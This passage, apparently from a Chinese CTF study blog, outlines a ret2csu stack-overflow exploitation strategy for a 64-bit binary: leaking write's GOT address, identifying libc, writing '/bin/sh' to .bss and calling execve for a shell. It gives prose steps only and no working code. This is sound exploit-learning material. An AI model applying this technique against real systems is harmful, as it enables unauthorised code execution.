<p>可以看到这个程序仅仅只有一个buffer  overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段,  最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。<mark>我们使用ROPgadget并没有找到类似于<code>pop rdi, ret</code>,<code>pop rsi, ret</code>这样的gadgets</mark>。(如果有则使用<code>ret2libc3</code>)</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.49kv9yn9wj28.webp"></p>
<p>程序为 64 位，开启了堆栈不可执行保护。</p>
<p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出：</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.2jibrdwf3gg0.webp"></p>
<p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 <code>/bin/sh</code> 字符串，所以两者都需要我们自己去构造了。</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.6gkb8r7bcjuo.webp"></p>
<p><strong>基本利用思路如下</strong></p>
<ul>
<li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li>
<li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li>
<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li>
<li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li>
</ul>
<p>详情参考此篇文章：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/105913597?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167556684916800182734027%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167556684916800182734027&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105913597-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=ret2csu&spm=1018.2226.3001.4187">ret2csu<i class="fas fa-external-link-alt"></i></a> （这篇文章已经讲的很详细了，在此不再赘述）</p>

            </div>

            
                <div class="post-copyright-info">
                    <div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li>
            <span class="type">本文标题</span>：<span class="content">栈溢出漏洞</span>
        </li>
        <li>
            <span class="type">本文作者</span>：<span class="content">二十八华生</span>
        </li>
        <li>
            <span class="type">创建时间</span>：<span class="content">2023-01-12 20:59:24</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2023/01/12/0_PWN/栈溢出漏洞/</span>
        </li>
        <li>
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0/">#假期学习</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">BUU-PWN刷题笔记</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">《程序员的自我修养:链接装载与库》笔记</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-text">栈溢出漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">一、基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-text">二、基本步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AF%BB%E6%89%BE%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-text">1.寻找危险函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%A1%AE%E5%AE%9A%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="nav-text">2.确定填充长度</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%9F%BA%E6%9C%ACROP"><span class="nav-text">三、基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="nav-text">1.介绍及原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-ret2text"><span class="nav-text">2.ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Aida%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95%E5%AF%BB%E5%9D%80"><span class="nav-text">方法一：ida静态调试寻址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Apwndbg%E5%8A%A8%E6%80%81%E5%AF%BB%E5%9D%80"><span class="nav-text">方法二：pwndbg动态寻址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEBUG"><span class="nav-text">寻找BUG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%BA%94%E5%A6%82%E6%AD%A4"><span class="nav-text">本应如此</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-ret2shellcode"><span class="nav-text">3.ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99shellcode%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">编写shellcode的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ctf-Wiki%E4%BE%8B%E9%A2%98"><span class="nav-text">Ctf-Wiki例题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-ret2syscall"><span class="nav-text">4.ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ROPgadget%E5%92%8Cropper%E7%9A%84%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97%EF%BC%88%E6%B2%A1%E6%9C%89%E5%BC%80%E5%90%AFPIE%E4%BF%9D%E6%8A%A4%EF%BC%89"><span class="nav-text">ROPgadget和ropper的食用指南（没有开启PIE保护）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8Dret2syscall"><span class="nav-text">32位ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8Dret2syscall"><span class="nav-text">64位ret2syscall</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-ret2libc1"><span class="nav-text">5.ret2libc1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-ret2libc2"><span class="nav-text">6.ret2libc2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8Dpayload%E7%9A%84%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="nav-text">第一种payload的解释：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8Dpayload%E7%9A%84%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="nav-text">第二种payload的解释：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-ret2libc3"><span class="nav-text">7.ret2libc3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E4%B8%AD%E7%BA%A7ROP"><span class="nav-text">四、中级ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ret2csu"><span class="nav-text">1.ret2csu</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">二十八华生</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
